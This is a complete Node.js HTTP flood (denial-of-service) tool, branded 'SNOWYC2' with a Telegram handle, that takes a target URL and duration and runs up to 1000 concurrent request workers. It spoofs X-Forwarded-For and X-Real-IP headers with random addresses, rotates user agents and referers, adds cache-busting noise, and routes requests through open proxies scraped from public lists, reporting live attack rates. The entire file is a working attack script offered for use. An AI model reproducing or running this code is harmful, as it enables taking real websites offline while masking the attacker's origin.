const axios = require('axios');
const fs = require('fs');
const os = require('os');
const http = require('http');
const https = require('https');
const process = require('process');

const MAX_CONCURRENT = Math.min(os.cpus().length * 100, 1000);
const REQUEST_TIMEOUT = 8000;

function loadLines(filename) {
    try {
        return fs.readFileSync(filename, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);
    } catch {
        return [];
    }
}

const REFERERS = loadLines('refs.txt');
const USER_AGENTS = loadLines('ua.txt');

const keepAliveHttp = new http.Agent({ keepAlive: true });
const keepAliveHttps = new https.Agent({ keepAlive: true });

let PROXIES = [];

async function fetchProxies() {
    const sources = [
        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
        'https://www.proxy-list.download/api/v1/get?type=http'
    ];
    let all = [];
    for (const url of sources) {
        try {
            const res = await axios.get(url);
            const lines = res.data.split('\n').map(p => p.trim()).filter(Boolean);
            all.push(...lines);
        } catch (err) {
            console.error('Failed to fetch proxies from:', url);
        }
    }
    PROXIES = [...new Set(all)]; // Deduplicate
}

class AttackEngine {
    constructor(target, duration) {
        this.target = target;
        this.duration = duration * 1000;
        this.startTime = Date.now();
        this.stats = {
            total: 0,
            success: 0,
            errors: 0,
            peakRps: 0
        };
        this.uaIndex = 0;
        this.running = true;
    }

    getRandomUA() {
        this.uaIndex = (this.uaIndex + 1) % USER_AGENTS.length;
        return USER_AGENTS[this.uaIndex];
    }

    getRandomReferer() {
        return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
    }

    async makeRequest() {
        const useProxy = Math.random() < 0.5 && PROXIES.length > 0;
        const randomIP = Array(4).fill(0).map(() => Math.floor(Math.random() * 255) + 1).join('.');
        const headers = {
            'User-Agent': this.getRandomUA(),
            'Referer': this.getRandomReferer(),
            'X-Forwarded-For': randomIP,
            'X-Real-IP': randomIP,
            'Accept': '*/*',
            'Connection': 'keep-alive'
        };

        const urlWithNoise = this.target + (this.target.includes('?') ? '&' : '?') + `cb=${Math.random().toString(36).substring(2)}`;

        const axiosOptions = {
            headers,
            timeout: REQUEST_TIMEOUT,
            httpAgent: keepAliveHttp,
            httpsAgent: keepAliveHttps,
            validateStatus: () => true
        };

        if (useProxy) {
            const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
            const [host, port] = proxy.split(':');
            axiosOptions.proxy = {
                host,
                port: parseInt(port)
            };
        }

        try {
            const response = await axios.get(urlWithNoise, axiosOptions);
            if (response.status === 200) this.stats.success++;
            else this.stats.errors++;
        } catch {
            this.stats.errors++;
        }

        this.stats.total++;
    }

    async startWorkers() {
        const workers = [];
        for (let i = 0; i < MAX_CONCURRENT; i++) {
            workers.push(this.workerLoop());
        }
        await Promise.all(workers);
    }

    async workerLoop() {
        while (this.running && Date.now() - this.startTime < this.duration) {
            await this.makeRequest();
        }
    }

    async runAttack() {
        const showIntro = () => {
            console.clear();
            console.log('\n  SNOWYC2 - T.ME/STSVKINGDOM');
            console.log('  ============================================');
            console.log(`  TARGET: ${this.target}`);
            console.log(`  TIME:   ${this.duration / 1000}s`);
            console.log(`  MODE:   RAPID STRIKE - ${MAX_CONCURRENT} Concurrent`);
            console.log('  ============================================\n');
        };

        await fetchProxies();
        showIntro();

        let lastTotal = 0;
        const printStats = setInterval(() => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = (this.stats.total - lastTotal) / 0.2;
            lastTotal = this.stats.total;
            this.stats.peakRps = Math.max(this.stats.peakRps, rps);

            process.stdout.write(
                `\r  SENT: ${this.stats.total} | 200 OK: ${this.stats.success} | ERR: ${this.stats.errors} | RPS: ${rps.toFixed(1)} `
            );
        }, 200);

        await this.startWorkers();
        this.running = false;
        clearInterval(printStats);
        this.printSummary();
    }

    printSummary() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const avgRps = this.stats.total / elapsed;
        console.log('\n\n  ATTACK FINISHED');
        console.log('  ============================================');
        console.log(`  TIME:        ${elapsed.toFixed(1)}s`);
        console.log(`  TOTAL:       ${this.stats.total}`);
        console.log(`  SUCCESS:     ${this.stats.success}`);
        console.log(`  ERRORS:      ${this.stats.errors}`);
        console.log(`  AVG RPS:     ${avgRps.toFixed(1)}`);
        console.log(`  PEAK RPS:    ${this.stats.peakRps.toFixed(1)}`);
        console.log('  ============================================\n');
    }
}

// Main
(async () => {
    const readline = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const ask = (q) => new Promise(resolve => readline.question(q, resolve));

    const targetInput = await ask("TARGET: ");
    let target = targetInput.trim();
    if (!target.startsWith("http")) {
        target = "http://" + target;
    }

    const durationInput = await ask("TIME (seconds): ");
    readline.close();

    const duration = parseInt(durationInput);
    if (isNaN(duration)) {
        console.log("Invalid time input.");
        return;
    }

    const engine = new AttackEngine(target, duration);
    try {
        await engine.runAttack();
    } catch (err) {
        console.error("Attack failed:", err.message);
    }
})();
